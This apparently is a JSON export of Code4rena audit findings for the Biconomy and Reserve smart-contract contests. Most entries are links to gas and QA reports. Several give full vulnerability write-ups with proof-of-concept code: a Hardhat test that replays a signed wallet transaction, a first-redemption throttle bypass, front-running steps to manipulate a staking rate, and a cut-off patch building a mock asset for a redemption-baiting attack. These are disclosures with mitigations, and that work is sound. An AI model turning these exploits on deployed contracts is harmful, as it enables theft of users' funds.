["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-16"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Bnke0x0-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/67", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-17"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/privateconstant-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/59", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-48"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-18"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/oyc_109-G.md)."}, {"title": "Replay attack (EIP712 signed transaction)", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/36", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-07"], "target": "2023-01-biconomy-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L212   # Vulnerability details  ## Impact Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never dissapears  ## Why it possible Contract checks `nonces[batchId]` but not `batchId` itself, so we could reuse other batches nounces. If before transaction we have `n` batches with the same nonce as transaction batch, then transaction can be replayed `n` times. Since there are 2^256 `batchId`s with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.  ## Proof of Concept Insert this test in `testGroup1.ts` right after `Should set the correct states on proxy` test:      it(\"replay EIP712 sign transaction\", async function () {       await token       .connect(accounts[0])       .transfer(userSCW.address, ethers.utils.parseEther(\"100\"));      const safeTx: SafeTransaction = buildSafeTransaction({       to: token.address,       data: encodeTransfer(charlie, ethers.utils.parseEther(\"10\").toString()),       nonce: await userSCW.getNonce(0),     });      const chainId = await userSCW.getChainId();     const { signer, data } = await safeSignTypedData(       accounts[0],       userSCW,       safeTx,       chainId     );      const transaction: Transaction = {       to: safeTx.to,       value: safeTx.value,       data: safeTx.data,       operation: safeTx.operation,       targetTxGas: safeTx.targetTxGas,     };     const refundInfo: FeeRefund = {       baseGas: safeTx.baseGas,       gasPrice: safeTx.gasPrice,       tokenGasPriceFactor: safeTx.tokenGasPriceFactor,       gasToken: safeTx.gasToken,       refundReceiver: safeTx.refundReceiver,     };      let signature = \"0x\";     signature += data.slice(2);       await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         0, // batchId         refundInfo,         signature       )     ).to.emit(userSCW, \"ExecutionSuccess\");      //contract checks nonces[batchId] but not batchId itself     //so we can change batchId to the one that have the same nonce     //this would replay transaction     await expect(       userSCW.connect(accounts[2]).execTransaction(         transaction,         1, // changed batchId         refundInfo,         signature       )     ).to.emit(userSCW, \"ExecutionSuccess\");      //charlie would have 20 tokens after this     expect(await token.balanceOf(charlie)).to.equal(       ethers.utils.parseEther(\"20\")     );     });  ## Recommended Mitigation Steps add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/35", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-49"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/csanuragjain-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/32", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-50"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/nadin-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/30", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-51"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Sathish9098-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/26", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-43"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/HE1M-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/24", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-52"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Raiders-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-19"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/arialblack14-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-20"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/12", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-53"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/RaymondFam-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "grade-b", "judge review requested", "sponsor confirmed", "edited-by-warden", "G-21"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pavankv-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/4", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-54"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-22"], "target": "2023-01-biconomy-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xhacksmithh-G.md)."}, {"title": "Battery discharge mechanism doesn't work correctly for first redemption", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/452", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/libraries/RedemptionBattery.sol#L59-L70   # Vulnerability details  ## Impact The `RTokenP1` contract implements a throttling mechanism using the `RedemptionBatteryLib` library. The library models a \"battery\" which \"recharges\" linearly block by block, over roughly 1 hour.  RToken.sol ```solidity     function redeem(uint256 amount) external notFrozen {         // ...          uint256 supply = totalSupply();          // ...         battery.discharge(supply, amount); // reverts on over-redemption          // ...     } ``` RedemptionBatteryLib.sol ```solidity     function discharge(         Battery storage battery,         uint256 supply,         uint256 amount     ) internal {         if (battery.redemptionRateFloor == 0 && battery.scalingRedemptionRate == 0) return;          // {qRTok}         uint256 charge = currentCharge(battery, supply);          // A nice error message so people aren't confused why redemption failed         require(amount <= charge, \"redemption battery insufficient\");          // Update battery         battery.lastBlock = uint48(block.number);         battery.lastCharge = charge - amount;     }      /// @param supply {qRTok} Total RToken supply before the burn step     /// @return charge {qRTok} The current total charge as an amount of RToken     function currentCharge(Battery storage battery, uint256 supply)         internal         view         returns (uint256 charge)     {         // {qRTok/hour} = {qRTok} * D18{1/hour} / D18         uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;          if (battery.redemptionRateFloor > amtPerHour) amtPerHour = battery.redemptionRateFloor;          // {blocks}         uint48 blocks = uint48(block.number) - battery.lastBlock;           // {qRTok} = {qRTok} + {qRTok/hour} * {blocks} / {blocks/hour}         charge = battery.lastCharge + (amtPerHour * blocks) / BLOCKS_PER_HOUR;          uint256 maxCharge = amtPerHour > supply ? supply : amtPerHour;         if (charge > maxCharge) charge = maxCharge;     } ``` The linear redemption limit is calculated in the `currentCharge` function. This function calculates the delta blocks by `uint48 blocks = uint48(block.number) - battery.lastBlock;`.  The bug here is that the `lastBlock` value is never initialized by the `RTokenP1` contract so its value defaults to `0`. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value ```         blocks = current block number - 0 = current block number ```  Due do this issue, the `currentCharge` value comes out to be way larger than the actual intended value for the first RToken redemption. The `maxCharge` cap at the end of `currentCharge` function caps the result to the current total supply of RToken.   The issue results in an instant first RToken redemption for the full `totalSupply` of the RToken. The battery discharging mechanism is completely neglected.  It should be noted that the issue only exists for the first ever redemption as during the first redemption the `lastBlock` value gets updated with current block number.     ## Proof of Concept The following test case was added to `test/RToken.test.ts` file and was ran using command `PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts`.  ```typescript   describe.only('Battery lastBlock bug', () => {     it('redemption battery does not work on first redemption', async () => {       // real chain scenario       await advanceBlocks(1_000_000)       await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, ethers.constants.MaxUint256)))        expect(await rToken.totalSupply()).to.eq(0)       await rToken.connect(owner).setRedemptionRateFloor(fp('1e4'))       await rToken.connect(owner).setScalingRedemptionRate(fp('0'))        // first issue       const issueAmount = fp('10000')       await rToken.connect(addr1)['issue(uint256)'](issueAmount)       expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)       expect(await rToken.totalSupply()).to.eq(issueAmount)        // first redemption       expect(await rToken.redemptionLimit()).to.eq(await rToken.totalSupply())    // for first redemption the currentCharge value is capped by rToken.totalSupply()        await rToken.connect(addr1).redeem(issueAmount)       expect(await rToken.totalSupply()).to.eq(0)        // second redemption       await rToken.connect(addr1)['issue(uint256)'](issueAmount)       expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)       // from second redemtion onwards the battery discharge mechanism takes place correctly       await expect(rToken.connect(addr1).redeem(issueAmount)).to.be.revertedWith('redemption battery insufficient')     })   }) ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps The `battery.lastBlock` value must be initialized in the `init` function of `RTokenP1` ```solidity     function init(         // ...     ) external initializer {         // ...         battery.lastBlock = uint48(block.number);     } ``` "}, {"title": "attacker can make stakeRate to be 1 in the StRSR contract and users depositing tokens can lose funds because of the big rounding error", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/439", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L160-L188 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L212-L237   # Vulnerability details  ## Impact code calculates amount of stake token and rsr token based on `stakeRate` and if `stakeRate` was near `1e18` then division error is small but attacker can cause `stakeRate` to be 1 and that can cause users to loss up to `1e18` token during stake and unstake.  ## Proof of Concept this is `init()` code: ```     function init(         IMain main_,         string calldata name_,         string calldata symbol_,         uint48 unstakingDelay_,         uint48 rewardPeriod_,         uint192 rewardRatio_     ) external initializer {         require(bytes(name_).length > 0, \"name empty\");         require(bytes(symbol_).length > 0, \"symbol empty\");         __Component_init(main_);         __EIP712_init(name_, \"1\");         name = name_;         symbol = symbol_;          assetRegistry = main_.assetRegistry();         backingManager = main_.backingManager();         basketHandler = main_.basketHandler();         rsr = IERC20(address(main_.rsr()));          payoutLastPaid = uint48(block.timestamp);         rsrRewardsAtLastPayout = main_.rsr().balanceOf(address(this));         setUnstakingDelay(unstakingDelay_);         setRewardPeriod(rewardPeriod_);         setRewardRatio(rewardRatio_);          beginEra();         beginDraftEra();     } ``` As you can see it sets the value of the `rsrRewardsAtLastPayout` as contract balance when contract is deployed. This is `_payoutReward()` code: ```     function _payoutRewards() internal {         if (block.timestamp < payoutLastPaid + rewardPeriod) return;         uint48 numPeriods = (uint48(block.timestamp) - payoutLastPaid) / rewardPeriod;          uint192 initRate = exchangeRate();         uint256 payout;          // Do an actual payout if and only if stakers exist!         if (totalStakes > 0) {             // Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.             // Apply payout to RSR backing             // payoutRatio: D18 = FIX_ONE: D18 - FixLib.powu(): D18             // Both uses of uint192(-) are fine, as it's equivalent to FixLib.sub().             uint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);              // payout: {qRSR} = D18{1} * {qRSR} / D18             payout = (payoutRatio * rsrRewardsAtLastPayout) / FIX_ONE;             stakeRSR += payout;         }          payoutLastPaid += numPeriods * rewardPeriod;         rsrRewardsAtLastPayout = rsrRewards();          // stakeRate else case: D18{qStRSR/qRSR} = {qStRSR} * D18 / {qRSR}         // downcast is safe: it's at most 1e38 * 1e18 = 1e56         // untestable:         //      the second half of the OR comparison is untestable because of the invariant:         //      if totalStakes == 0, then stakeRSR == 0         stakeRate = (stakeRSR == 0 || totalStakes == 0)             ? FIX_ONE             : uint192((totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR);          emit RewardsPaid(payout);         emit ExchangeRateSet(initRate, exchangeRate());     } ``` As you can see it sets the value of the `stakeRate`  to `(totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR`.  So to exploit this attacker needs to perform this steps: 1. send `200 * 1e18` RSR tokens (18 is the precision) to the StRSR address before its deployment by watching mempool and front running. the deployment address is calculable before deployment. 2. function `init()` would get executed and would set `200 * 1e18` as `rsrRewardsAtLastPayout`. 3. then attacker would call `stake()` and stake 1 RSR token (1 wei) in the contract and the value of `stakeRSR` and `totalStakes` would be 1. 4. then attacker wait for `rewardPeriod` seconds and then call `payoutReward()` and code would pay rewards based on `rewardRatio` and `rsrRewardsAtLastPayout` and as `rewardRatio` is higher than 1% (default and normal mode) code would increase `stakeRate` more than `2 * 1e18` amount. and then code would set `stakeRate` as `totalStakes * FIX_ONE_256 + (stakeRSR - 1)) / stakeRSR = 1`. 5. then calls to `stake()` would cause users to lose up to `1e18` RSR tokens as code calculates stake amount as `newTotalStakes = (stakeRate * newStakeRSR) / FIX_ONE` and rounding error happens up to `FIX_ONE`. because the calculated stake amount is worth less than deposited rsr amount up to `1e18`. 6. attacker can still users funds by unstaking 1 token and receiving `1e18` RSR tokens. because of the rounding error in `unstake()`  so attacker can manipulate the `stakeRate` in contract deployment time with sandwich attack which can cause other users to lose funds because of the big rounding error.  ## Tools Used VIM  ## Recommended Mitigation Steps prevent early manipulation of the PPS"}, {"title": "Baited by redemption during undercollateralization (no issuance, just transfer)", "html_url": "https://github.com/code-423n4/2023-01-reserve-findings/issues/416", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-01-reserve-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/fdd9f81fe58953d758dbea62beed169a74523de1/contracts/p1/RToken.sol#L420   # Vulnerability details  ## Impact This is similar to the \"high\" vulnerability I submitted, but also shows a similar exploit can be done if a user isn't a whale, and isn't issuing anything.   A user can send a redeem TX and an evil actor can make it so they get almost nothing back during recollateralization. This requires ordering transactions, or just getting very unlucky with the order of your transaction.   ## Proof of Concept - UserA is looking to redeem their rToken for tokenA (the max the battery will allow, let's say 100k) - A basket refresh is about to be triggered - Evil user wants the protocol to steal UserA's funds - UserA sends redeem TX to the mempool, but Evil user move transactions around before it hits  - Evil user calls refreshbasket in same block as original collateral (tokenA) is disabled, kicking in backupconfig (tokenB) - Protocol is now undercollateralized but collateral is sound (tokenB is good) - Evil sends 1tokenB to backingManager to UserA's redeem has something to redeem - UserA's redemption tx lands, and redeems 100k rTokens for a fraction of tokenB!   UserA redeems and has nothing to show for it! Evil user only had to buy 1 tokenB (or even less) to steal 100k of their rToken  ## Tools Used  Hardhat  ## Recommended Mitigation Steps  Disallow redemptions/issuance during undercollateralization  ## Proof of Code   To run: 1. git clone https://github.com/reserve-protocol/protocol.git 2. cd protocol 3. Copy paste the below code to a file like `/tmp/changes.patch` 4. git apply /tmp/changes.patch 5. yarn 6. yarn hardhat test test/submission-test.test.ts  ``` diff --git a/contracts/ShitAsset.sol b/contracts/ShitAsset.sol new file mode 100644 index 00000000..5420e914 --- /dev/null +++ b/contracts/ShitAsset.sol @@ -0,0 +1,222 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\"; +import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\"; +import \"./plugins/assets/OracleLib.sol\"; +import \"hardhat/console.sol\"; + +contract ShitAsset { +    using FixLib for uint192; +    using OracleLib for AggregatorV3Interface; + +    // AggregatorV3Interface public immutable chainlinkFeed; // {UoA/tok} + +    IERC20Metadata private s_erc20; +    bool revertErc20 = false; + +    CollateralStatus myStatus; + +    uint8 public immutable erc20Decimals; + +    uint192 public immutable maxTradeVolume; // {UoA} + +    uint48 public immutable oracleTimeout; // {s} Seconds that an oracle value is considered valid + +    // uint192 public immutable oracleError; // {1} The max % deviation allowed by the oracle + +    // === Lot price === + +    uint48 public immutable priceTimeout; // {s} The period over which `savedHighPrice` decays to 0 + +    uint192 public savedLowPrice; // {UoA/tok} The low price of the token during the last update + +    uint192 public savedHighPrice; // {UoA/tok} The high price of the token during the last update + +    uint48 public lastSave; // {s} The timestamp when prices were last saved + +    string public name; + +    /// @param priceTimeout_ {s} The number of seconds over which savedHighPrice decays to 0 +    /// @param chainlinkFeed_ Feed units: {UoA/tok} +    /// @param oracleError_ {1} The % the oracle feed can be off by +    /// @param maxTradeVolume_ {UoA} The max trade volume, in UoA +    /// @param oracleTimeout_ {s} The number of seconds until a oracle value becomes invalid +    constructor( +        uint48 priceTimeout_, +        AggregatorV3Interface chainlinkFeed_, +        uint192 oracleError_, // @follow-up , this can change +        IERC20Metadata erc20_, +        uint192 maxTradeVolume_, +        uint48 oracleTimeout_ +    ) { +        require(priceTimeout_ > 0, \"price timeout zero\"); +        require(address(chainlinkFeed_) != address(0), \"missing chainlink feed\"); +        require(oracleError_ > 0 && oracleError_ < FIX_ONE, \"oracle error out of range\"); +        require(address(erc20_) != address(0), \"missing erc20\"); +        require(maxTradeVolume_ > 0, \"invalid max trade volume\"); +        require(oracleTimeout_ > 0, \"oracleTimeout zero\"); +        priceTimeout = priceTimeout_; +        // chainlinkFeed = chainlinkFeed_; +        // oracleError = oracleError_; +        s_erc20 = erc20_; +        // erc20 = IERC20Metadata(0x000000000000000000000000000000000000dEaD); +        erc20Decimals = s_erc20.decimals(); +        maxTradeVolume = maxTradeVolume_; +        oracleTimeout = oracleTimeout_; +        myStatus = CollateralStatus.SOUND; +        savedLowPrice = 0; +        savedHighPrice = 0; +    } + +    function updateErc20(address newErc20) public { +        if (newErc20 == address(0)) { +            revertErc20 = true; +        } +        s_erc20 = IERC20Metadata(newErc20); +    } + +    /// Can revert, used by other contract functions in order to catch errors +    /// Should not return FIX_MAX for low +    /// Should only return FIX_MAX for high if low is 0 +    /// @dev The third (unused) variable is only here for compatibility with Collateral +    /// @param low {UoA/tok} The low price estimate +    /// @param high {UoA/tok} The high price estimate +    function tryPrice() external view virtual returns (uint192 low, uint192 high, uint192) { +        // uint192 p = chainlinkFeed.price(oracleTimeout); // {UoA/tok} +        // uint192 delta = p.mul(oracleError); +        // return (p - delta, p + delta, 0); +        return (savedLowPrice, savedHighPrice, uint192(0)); +    } + +    function updatePrice(uint192 low, uint192 high) public { +        savedLowPrice = uint192(low); +        savedHighPrice = uint192(high); +        lastSave = uint48(block.timestamp); +    } + +    /// Should not revert +    /// Refresh saved prices +    function refresh() public virtual { +        // // @follow-up +        // // wonder if you could make this more gas efficient returning _? +        // try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +        //     // {UoA/tok}, {UoA/tok} +        //     // (0, 0) is a valid price; (0, FIX_MAX) is unpriced +        //     // Save prices if priced +        //     if (high < FIX_MAX) { +        //         savedLowPrice = low; +        //         savedHighPrice = high; +        //         lastSave = uint48(block.timestamp); +        //     } else { +        //         // must be unpriced +        //         // @follow-up +        //         // @pat why not revert here? +        //         assert(low == 0); +        //     } +        // } catch (bytes memory errData) { +        //     // see: docs/solidity-style.md#Catching-Empty-Data +        //     // @follow-up their docs should be updated, they no longer apply to this... +        //     // Why are they not being marked to iffy here? +        //     if (errData.length == 0) revert(); // solhint-disable-line reason-string +        // } +    } + +    // Should not revert +    //@dev Should be general enough to not need to be overridden +    // @return {UoA/tok} The lower end of the price estimate +    // @return {UoA/tok} The upper end of the price estimate +    function price() public view virtual returns (uint192, uint192) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            assert(low <= high); +            return (low, high); +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string +            return (0, FIX_MAX); +        } +    } + +    // Should not revert +    // lotLow should be nonzero when the asset might be worth selling +    // @dev Should be general enough to not need to be overridden +    // @return lotHigh {UoA/tok} The upper end of the lot price estimate +    function lotPrice() external view virtual returns (uint192 lotLow, uint192 lotHigh) { +        try this.tryPrice() returns (uint192 low, uint192 high, uint192) { +            // if the price feed is still functioning, use that +            lotLow = low; +            lotHigh = high; +        } catch (bytes memory errData) { +            // see: docs/solidity-style.md#Catching-Empty-Data +            if (errData.length == 0) revert(); // solhint-disable-line reason-string + +            // if the price feed is broken, use a decayed historical value + +            uint48 delta = uint48(block.timestamp) - lastSave; // {s} +            if (delta >= priceTimeout) return (0, 0); // no price after timeout elapses + +            // {1} = {s} / {s} +            uint192 lotMultiplier = divuu(priceTimeout - delta, priceTimeout); + +            // {UoA/tok} = {UoA/tok} * {1} +            lotLow = savedLowPrice.mul(lotMultiplier); +            lotHigh = savedHighPrice.mul(lotMultiplier); +        } +        assert(lotLow <= lotHigh); +    } + +    // @return {tok} The balance of the ERC20 in whole tokens +    function bal(address account) external view returns (uint192) { +        return shiftl_toFix(s_erc20.balanceOf(account), -int8(erc20Decimals)); +    } + +    function isCollateral() external pure virtual returns (bool) { +        return true; +    } + +    // solhint-disable no-empty-blocks + +    /// Claim rewards earned by holding a balance of the ERC20 token +    /// @dev Use delegatecall +    function claimRewards() external virtual {} + +    // solhint-enable no-empty-blocks +    enum CollateralStatus { +        SOUND, +        IFFY, // When a peg is not holding or a chainlink feed is stale +        DISABLED // When the collateral has completely defaulted +    } + +    function updateStatus(CollateralStatus newStatus) public { +        myStatus = newStatus; +    } + +    // collateral stuff +    function status() public view returns (CollateralStatus) { +        return myStatus; +    } + +    function updateName(string memory newName) public { +        name = newName; +    } + +    function targetName() public view returns (bytes32) { +        // this is \"shit\" in hex +        return 0x7368697400000000000000000000000000000000000000000000000000000000; +    } + +    function targetPerRef() public view returns (uint192) { +        return FIX_ONE; +    } + +    function refPerTok() public view returns (uint192) { +        return FIX_ONE; +    } + +    function erc20() public view returns (IERC20Metadata) { +        if (revertErc20) { +            revert(\"revertErc20\"); +        } +        return s_erc20; +    } +} diff --git a/contracts/facade/PatrickFacadeWrite.sol b/contracts/facade/PatrickFacadeWrite.sol new file mode 100644 index 00000000..72be7d3a --- /dev/null +++ b/contracts/facade/PatrickFacadeWrite.sol @@ -0,0 +1,214 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import \"../interfaces/IFacadeWrite.sol\"; +import \"./lib/FacadeWriteLib.sol\"; +import \"hardhat/console.sol\"; + +/** + * @title FacadeWrite + * @notice A UX-friendly layer to interact with the protocol + * @dev Under the hood, uses two external libs to deal with blocksize limits. + */ +contract PatrickFacadeWrite is IFacadeWrite { +    using FacadeWriteLib for address; + +    IDeployer public immutable deployer; + +    constructor(IDeployer deployer_) { +        require(address(deployer_) != address(0), \"invalid address\"); +        deployer = deployer_; +    } + +    /// Step 1 +    function deployRToken( +        ConfigurationParams calldata config, +        SetupParams calldata setup +    ) external returns (address) { +        // Perform validations +        require(setup.primaryBasket.length > 0, \"no collateral\"); +        require(setup.primaryBasket.length == setup.weights.length, \"invalid length\"); + +        // Validate backups +        for (uint256 i = 0; i < setup.backups.length; ++i) { +            require(setup.backups[i].backupCollateral.length > 0, \"no backup collateral\"); +        } + +        // Validate beneficiaries +        for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +            require( +                setup.beneficiaries[i].beneficiary != address(0) && +                    (setup.beneficiaries[i].revShare.rTokenDist > 0 || +                        setup.beneficiaries[i].revShare.rsrDist > 0), +                \"beneficiary revShare mismatch\" +            ); +        } + +        // Deploy contracts +        IRToken rToken = IRToken( +            deployer.deploy( +                config.name, +                config.symbol, +                config.mandate, +                address(this), // set as owner +                config.params +            ) +        ); + +        // Get Main +        IMain main = rToken.main(); +        IAssetRegistry assetRegistry = main.assetRegistry(); +        IBackingManager backingManager = main.backingManager(); +        IBasketHandler basketHandler = main.basketHandler(); + +        // Register assets +        for (uint256 i = 0; i < setup.assets.length; ++i) { +            require(assetRegistry.register(setup.assets[i]), \"duplicate asset\"); +            backingManager.grantRTokenAllowance(setup.assets[i].erc20()); +        } + +        // Setup basket +        { +            IERC20[] memory basketERC20s = new IERC20[](setup.primaryBasket.length); + +            // Register collateral +            for (uint256 i = 0; i < setup.primaryBasket.length; ++i) { +                // require(assetRegistry.register(setup.primaryBasket[i]), \"duplicate collateral\"); +                assetRegistry.register(setup.primaryBasket[i]); +                IERC20 erc20 = setup.primaryBasket[i].erc20(); + +                basketERC20s[i] = erc20; +                backingManager.grantRTokenAllowance(erc20); +            } + +            // Set basket + +            // can't issue without setting and call ing refresh +            basketHandler.setPrimeBasket(basketERC20s, setup.weights); +            basketHandler.refreshBasket(); +        } + +        // Setup backup config +        { +            for (uint256 i = 0; i < setup.backups.length; ++i) { +                IERC20[] memory backupERC20s = new IERC20[]( +                    setup.backups[i].backupCollateral.length +                ); + +                for (uint256 j = 0; j < setup.backups[i].backupCollateral.length; ++j) { +                    ICollateral backupColl = setup.backups[i].backupCollateral[j]; +                    assetRegistry.register(backupColl); // do not require the asset is new +                    IERC20 erc20 = backupColl.erc20(); +                    backupERC20s[j] = erc20; +                    backingManager.grantRTokenAllowance(erc20); +                } + +                basketHandler.setBackupConfig( +                    setup.backups[i].backupUnit, +                    setup.backups[i].diversityFactor, +                    backupERC20s +                ); +            } +        } + +        // // Setup revshare beneficiaries +        // for (uint256 i = 0; i < setup.beneficiaries.length; ++i) { +        //     main.distributor().setDistribution( +        //         setup.beneficiaries[i].beneficiary, +        //         setup.beneficiaries[i].revShare +        //     ); +        // } + +        // // Pause until setupGovernance +        // main.pause(); + +        // // Setup deployer as owner to complete next step - do not renounce roles yet +        main.grantRole(OWNER, msg.sender); + +        // Return rToken address +        return address(rToken); +    } + +    /// Step 2 +    /// @return newOwner The address of the new owner +    function setupGovernance( +        IRToken rToken, +        bool deployGovernance, +        bool unpause, +        GovernanceParams calldata govParams, +        address owner, +        address guardian, +        address pauser +    ) external returns (address newOwner) { +        // Get Main +        IMain main = rToken.main(); + +        require(main.hasRole(OWNER, address(this)), \"ownership already transferred\"); +        require(main.hasRole(OWNER, msg.sender), \"not initial deployer\"); + +        // Remove ownership to sender +        main.revokeRole(OWNER, msg.sender); + +        if (deployGovernance) { +            require(owner == address(0), \"owner should be empty\"); + +            TimelockController timelock = new TimelockController( +                govParams.timelockDelay, +                new address[](0), +                new address[](0) +            ); + +            // Deploy Governance contract +            address governance = FacadeWriteLib.deployGovernance( +                IStRSRVotes(address(main.stRSR())), +                timelock, +                govParams.votingDelay, +                govParams.votingPeriod, +                govParams.proposalThresholdAsMicroPercent, +                govParams.quorumPercent +            ); +            emit GovernanceCreated(rToken, governance, address(timelock)); + +            // Setup Roles +            timelock.grantRole(timelock.PROPOSER_ROLE(), governance); // Gov only proposer +            timelock.grantRole(timelock.CANCELLER_ROLE(), guardian); // Guardian as canceller +            timelock.grantRole(timelock.EXECUTOR_ROLE(), address(0)); // Anyone as executor +            